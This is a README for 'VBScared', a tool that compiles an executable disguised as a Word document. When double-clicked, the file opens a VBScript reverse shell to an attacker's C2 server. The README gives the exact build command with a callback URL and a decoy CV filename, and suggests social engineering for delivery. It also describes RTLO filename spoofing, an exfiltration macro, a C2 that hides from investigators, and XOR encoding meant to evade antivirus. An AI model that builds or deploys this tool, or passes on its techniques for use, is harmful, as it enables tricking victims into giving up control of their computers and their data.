# VBScared Tool 👻

VBScared is an executable, disguised as a .docx file, that executes a VBScript in-memory reverse shell upon double clicking. The executable can be delivered to victims via social engineering tactics.

## Demo

https://github.com/user-attachments/assets/223b6022-3abf-4a4d-b086-1ede8bb9ca19

## Installation

2 tools are needed during compilation. Add the following binaries to your PATH:

* [Windres](https://winlibs.com/) (this is needed to attach icons to the generated executable and is included in mingw-w64, scroll down to find the downloads)
* [CL](https://visualstudio.microsoft.com/) (included in visual studio, example path C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.41.34120\bin\Hostx64\x64\cl.exe)
* [VsDevCmd](https://visualstudio.microsoft.com/) (included in visual studio, example path C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat)

Next, install the necessary python packages using `py -3 -m pip install -r requirements.txt`.

## Automated build

After adding the previous binaries to your PATH, you can run the `generate.py` script under `scripts` to automate the build process. For example, running the following command will result in an executable disguised as `CV-of-Alexe.docx`. Note that we chose the name Alexe here, as exe is always present in the name.

```
py -3 .\scripts\generate.py -p disguisedshell.vbs -a CALLBACK_URL=http://localhost:80/ FILE_URL=https://cdn.create.microsoft.com/catalog-assets/en-us/972db91c-baf9-4c6b-9605-00b3aa24e07c/TF972db91c-baf9-4c6b-9605-00b3aa24e07c06706e45_wac-21b6606d1277.docx FILE_OUTPUT_NAME=CV-of-Alexe.docx -o CV-of-Al  -s **[]!?**
```

## C2

The `disguisedshell.vbs` payload is designed to work with the bundled python C2 server. To use the C2 server, simply point your CALLBACK_URL (when using `generate.py`, see above) to your C2 host. The C2 will notify you in case a client connects. Type `HELP` for possible commands.

## Features
* Manage multiple connected clients
* Execute commands
* C2 detection evasion, the C2 detects client requests from investigation/other requests and will answer with 404 if request is not coming from client
* Exfilatration macro available
* Payloads are encoded (XOR + key) inside the executable and decoded at runtime. Use -s to encode with a key, different keys will result in different signatures for your executable. This is also useful to avoid AV detection.
* Traffic between clients and the C2 is encoded (XOR + key) to avoid detection.

## Extendability

You can use the vbscared tool with your own custom vbs payloads (use the -p flag to choose your payload).

## Q&A

#### Why is it not visible to the naked eye that the exploit file is actually an executable
We make use of a technique called RTLO hacking (right-to-left-override hacking) to hide our malware in plain sight, see [here](https://www.freecodecamp.org/news/rtlo-in-hacking/) for a detailed explanation.

#### Why do you use vbscript?
This is a small pet project of mine, I chose to execute VBS in-memory because I was up for the challenge and wanted to learn. The main intention was to avoid AV engines by executing VBS in-memory.